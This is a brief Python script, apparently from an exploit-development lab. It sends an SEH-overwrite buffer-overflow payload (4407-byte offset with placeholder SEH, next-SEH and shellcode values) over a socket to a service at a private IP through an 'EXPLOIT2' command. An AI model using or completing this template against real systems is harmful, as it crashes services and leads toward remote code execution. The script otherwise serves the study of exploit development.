#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
from struct import *

host="192.168.2.206"
port=7274

# !mona findmsp

offset = "A" * 4407
nseh = "BBBB"
seh = "CCCC"
shellcode = "D" * 500

payload = offset + nseh + seh + shellcode

buffer = "EXPLOIT2 "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host,port))

print("Enviando " + str(len(buffer))  + "bytes")
exp.send(buffer)
print(exp.recv(1024))
exp.close()